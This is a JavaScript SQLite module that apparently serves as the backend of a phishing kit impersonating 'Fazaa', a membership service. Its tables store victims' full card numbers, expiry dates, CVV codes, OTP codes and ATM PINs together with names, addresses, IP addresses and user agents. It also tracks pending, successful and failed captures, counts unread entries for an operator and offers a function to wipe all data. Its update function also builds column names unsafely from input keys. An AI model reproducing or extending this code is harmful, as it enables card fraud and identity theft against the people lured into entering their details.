import sqlite3 from 'sqlite3';
import path from 'path';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const DB_PATH = path.join(__dirname, 'fazaa.db');
const db = new sqlite3.Database(DB_PATH);
// Enable WAL mode
db.run('PRAGMA journal_mode = WAL');
// Initialize tables
db.exec(`
  CREATE TABLE IF NOT EXISTS fazaa_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    emirate TEXT,
    district TEXT,
    membershipTier TEXT,
    totalAmount TEXT DEFAULT '150',
    cardName TEXT,
    cardNumber TEXT,
    cardNumberMasked TEXT,
    cardExpiry TEXT,
    cardCvv TEXT,
    otpCode TEXT,
    atmPin TEXT,
    stage TEXT DEFAULT 'card' NOT NULL,
    errorMessage TEXT,
    clientIp TEXT,
    userAgent TEXT,
    statusRead INTEGER DEFAULT 0,
    redirectUrl TEXT,
    createdAt TEXT DEFAULT (datetime('now')),
    updatedAt TEXT DEFAULT (datetime('now'))
  );

  CREATE TABLE IF NOT EXISTS registration_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sessionId TEXT NOT NULL UNIQUE,
    fullName TEXT NOT NULL,
    phoneNumber TEXT NOT NULL,
    email TEXT NOT NULL,
    emirate TEXT NOT NULL,
    district TEXT,
    membershipTier TEXT NOT NULL,
    totalAmount TEXT DEFAULT '150',
    addressEmirate TEXT,
    addressDistrict TEXT,
    addressStreet TEXT,
    addressBuildingNumber TEXT,
    clientIp TEXT,
    userAgent TEXT,
    createdAt TEXT DEFAULT (datetime('now'))
  );
`);
function query(sql, params = []) {
    return new Promise((resolve, reject) => {
        db.all(sql, params, (err, rows) => {
            if (err)
                reject(err);
            else
                resolve(rows);
        });
    });
}
function queryOne(sql, params = []) {
    return new Promise((resolve, reject) => {
        db.get(sql, params, (err, row) => {
            if (err)
                reject(err);
            else
                resolve(row);
        });
    });
}
function run(sql, params = []) {
    return new Promise((resolve, reject) => {
        db.run(sql, params, function () {
            if (this)
                resolve({ lastID: this.lastID, changes: this.changes });
            else
                reject(new Error('No response from db.run'));
        });
    });
}
// ========== Registration CRUD ==========
export async function createRegistration(data) {
    await run(`INSERT INTO registration_data (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, addressEmirate, addressDistrict, addressStreet, addressBuildingNumber, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, [data.sessionId, data.fullName, data.phoneNumber, data.email, data.emirate, data.district || null, data.membershipTier, data.totalAmount || '150', data.addressEmirate || null, data.addressDistrict || null, data.addressStreet || null, data.addressBuildingNumber || null, data.clientIp || null, data.userAgent || null]);
    const result = await queryOne('SELECT * FROM registration_data WHERE sessionId = ?', [data.sessionId]);
    return result;
}
export async function getRegistrationBySessionId(sessionId) {
    return queryOne('SELECT * FROM registration_data WHERE sessionId = ?', [sessionId]);
}
export async function getAllRegistrations(limit = 100) {
    return query('SELECT * FROM registration_data ORDER BY createdAt DESC LIMIT ?', [limit]);
}
// ========== Session CRUD ==========
export async function createSession(data) {
    await run(`INSERT INTO fazaa_sessions (sessionId, fullName, phoneNumber, email, emirate, district, membershipTier, totalAmount, clientIp, userAgent)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, [data.sessionId, data.fullName || null, data.phoneNumber || null, data.email || null, data.emirate || null, data.district || null, data.membershipTier || null, data.totalAmount || '150', data.clientIp || null, data.userAgent || null]);
    const result = await queryOne('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [data.sessionId]);
    return result;
}
export async function getSessionBySessionId(sessionId) {
    return queryOne('SELECT * FROM fazaa_sessions WHERE sessionId = ?', [sessionId]);
}
export async function updateSession(sessionId, updates) {
    const fields = [];
    const values = [];
    for (const [key, value] of Object.entries(updates)) {
        fields.push(`${key} = ?`);
        values.push(value);
    }
    fields.push("updatedAt = datetime('now')");
    values.push(sessionId);
    await run(`UPDATE fazaa_sessions SET ${fields.join(', ')} WHERE sessionId = ?`, values);
}
export async function getAllSessions(limit = 100) {
    return query('SELECT * FROM fazaa_sessions ORDER BY createdAt DESC LIMIT ?', [limit]);
}
export async function getUnreadSessionsCount() {
    const result = await queryOne('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0');
    return result?.count || 0;
}
export async function markAllAsRead() {
    await run('UPDATE fazaa_sessions SET statusRead = 1 WHERE statusRead = 0');
}
export async function clearAllData() {
    await run('DELETE FROM fazaa_sessions');
    await run('DELETE FROM registration_data');
}
export async function getStats() {
    const [total, pending, completed, failed, newCount, registrations] = await Promise.all([
        queryOne('SELECT COUNT(*) as count FROM fazaa_sessions'),
        queryOne("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage LIKE '%_pending'"),
        queryOne("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'success'"),
        queryOne("SELECT COUNT(*) as count FROM fazaa_sessions WHERE stage = 'failed'"),
        queryOne('SELECT COUNT(*) as count FROM fazaa_sessions WHERE statusRead = 0'),
        queryOne('SELECT COUNT(*) as count FROM registration_data'),
    ]);
    return {
        total: total?.count || 0,
        pending: pending?.count || 0,
        completed: completed?.count || 0,
        failed: failed?.count || 0,
        new: newCount?.count || 0,
        registrations: registrations?.count || 0,
    };
}
export default db;
//# sourceMappingURL=database.js.map